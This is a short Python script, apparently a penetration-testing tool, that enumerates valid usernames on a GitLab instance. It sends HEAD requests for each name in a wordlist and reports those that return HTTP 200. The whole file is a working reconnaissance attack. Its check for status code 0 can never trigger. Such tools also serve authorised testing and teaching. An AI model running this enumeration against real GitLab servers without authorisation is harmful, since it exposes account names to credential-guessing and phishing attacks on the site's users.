#!/usr/bin/env python3

import requests
import argparse


def main():
    parser = argparse.ArgumentParser(description="GitLab User Enumeration")
    parser.add_argument(
        "--url", "-u", type=str, required=True,
        help="The URL of the GitLab instance",
    )
    parser.add_argument(
        "--wordlist", "-w", type=str, required=True,
        help="Path to the username wordlist",
    )
    parser.add_argument("-v", action="store_true", help="Enable verbose mode")
    args = parser.parse_args()

    print("GitLab User Enumeration in python")

    with open(args.wordlist, "r") as f:
        for line in f:
            username = line.strip()
            if args.v:
                print(f"Trying username {username}...")
            http_code = requests.head(f"{args.url}/{username}").status_code
            if http_code == 200:
                print(f"[+] The username {username} exists!")
            elif http_code == 0:
                print("[!] The target is unreachable.")
                break


if __name__ == "__main__":
    main()
